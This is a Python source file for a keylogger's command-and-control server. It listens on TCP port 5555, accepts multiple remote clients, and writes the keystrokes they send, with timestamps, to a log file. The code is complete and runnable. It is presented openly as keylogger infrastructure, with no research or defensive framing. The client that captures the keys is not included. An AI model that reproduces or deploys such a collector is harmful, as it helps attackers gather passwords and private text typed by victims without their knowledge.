import socket
import threading
import time
from datetime import datetime

class KeyloggerServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.running = False
        
    def start(self):
        """Start the keylogger server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow reuse of address
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.running = True
        
        print(f"[+] Server started on {self.host}:{self.port}")
        print("[+] Waiting for clients to connect...")
        
        # Create log file
        with open("server_keylog.txt", "w") as log_file:
            log_file.write("================ KEYLOGGER SERVER ================\n")
            log_file.write(f"Server started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            log_file.write("=================================================\n\n")
        
        # Start accepting clients
        accept_thread = threading.Thread(target=self.accept_clients)
        accept_thread.daemon = True
        accept_thread.start()
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop()
    
    def accept_clients(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                print(f"[+] New client connected: {client_address[0]}:{client_address[1]}")
                
                # Create a thread to handle this client
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.daemon = True
                client_thread.start()
                
                self.clients.append((client_socket, client_address))
            except Exception as e:
                if self.running:
                    print(f"[!] Error accepting client: {e}")
                break
    
    def handle_client(self, client_socket, client_address):
        """Handle communication with a client"""
        client_id = f"{client_address[0]}:{client_address[1]}"
        
        # Log new client connection
        with open("server_keylog.txt", "a") as log_file:
            log_file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
            log_file.write(f"New client connected: {client_id}\n")
            log_file.write("-------------------------------------------------\n")
        
        try:
            while self.running:
                # Receive data from client
                data = client_socket.recv(1024).decode('utf-8')
                
                if not data:
                    break
                
                # Log received keystrokes
                with open("server_keylog.txt", "a") as log_file:
                    log_file.write(f"{data}")
        except Exception as e:
            print(f"[!] Error with client {client_id}: {e}")
        finally:
            # Remove and close client connection
            if (client_socket, client_address) in self.clients:
                self.clients.remove((client_socket, client_address))
            client_socket.close()
            
            # Log client disconnection
            with open("server_keylog.txt", "a") as log_file:
                log_file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
                log_file.write(f"Client disconnected: {client_id}\n")
                log_file.write("-------------------------------------------------\n")
            
            print(f"[-] Client disconnected: {client_id}")
    
    def stop(self):
        """Stop the server and close all connections"""
        self.running = False
        
        # Close all client connections
        for client_socket, _ in self.clients:
            try:
                client_socket.close()
            except:
                pass
        self.clients.clear()
        
        # Close server socket
        if self.server_socket:
            self.server_socket.close()
        
        print("\n[-] Server stopped")
        
        # Log server stop
        with open("server_keylog.txt", "a") as log_file:
            log_file.write(f"\nServer stopped: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            log_file.write("================ SERVER STOPPED ================\n")

if __name__ == "__main__":
    server = KeyloggerServer()
    server.start()